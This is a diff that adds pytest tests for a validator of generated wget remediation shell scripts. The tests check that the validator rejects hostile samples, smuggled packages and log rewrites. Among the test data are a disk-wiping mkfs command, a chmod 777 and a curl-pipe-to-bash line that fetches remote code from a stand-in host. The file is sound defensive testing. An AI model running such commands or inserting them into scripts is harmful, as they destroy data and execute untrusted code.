@@ -107,3 +107,50 @@ def test_disable_security_fails_level3(tmp_path: Path):
     report = validate_script(script, package_name="wget")
     assert not report.passed
     assert any(f["rule"] == "disable_security_controls" for f in report.findings)
+
+
+def test_mkfs_chmod_and_curl_pipe_are_rejected(tmp_path: Path):
+    samples = {
+        "mkfs": "#!/usr/bin/env bash\nmkfs.ext4 /dev/xvdf\napt-get install -y wget\n",
+        "chmod": "#!/usr/bin/env bash\nchmod 777 /tmp/wget-lab\napt-get install -y wget\n",
+        "curl": "#!/usr/bin/env bash\ncurl https://example.invalid/x.sh | bash\napt-get install -y wget\n",
+    }
+    for name, content in samples.items():
+        script = _write(tmp_path, f"{name}.sh", content)
+        report = validate_script(script, package_name="wget")
+        assert not report.level3.passed, name
+        assert not report.passed
+
+
+def test_shell_operator_does_not_hide_another_package(tmp_path: Path):
+    script = _write(
+        tmp_path,
+        "remediation.sh",
+        """#!/usr/bin/env bash
+readonly PACKAGE="wget"
+apt-get install -y "$PACKAGE" || apt-get install -y curl
+""",
+    )
+    report = validate_script(script, package_name="wget")
+    assert any("curl" in finding["detail"] for finding in report.findings)
+
+
+def test_original_wget_scripts_revalidate_without_rewriting_logs(tmp_path: Path):
+    root = Path(__file__).resolve().parents[1]
+    base = root / "generated_scripts" / "CVE-2024-38428"
+    for name in ("rep02", "rep03", "rep04"):
+        directory = base / name
+        script = directory / "remediation.sh"
+        original = script.read_bytes()
+        preserved = (directory / "validation.json").read_bytes()
+        log = (directory / "validation.log").read_bytes()
+        report = validate_script(
+            script,
+            package_name="wget",
+            persist_dir=tmp_path / name,
+        )
+        assert report.passed, name
+        assert script.read_bytes() == original
+        assert (directory / "validation.json").read_bytes() == preserved
+        assert (directory / "validation.log").read_bytes() == log
+        assert (tmp_path / name / "validation.json").is_file()
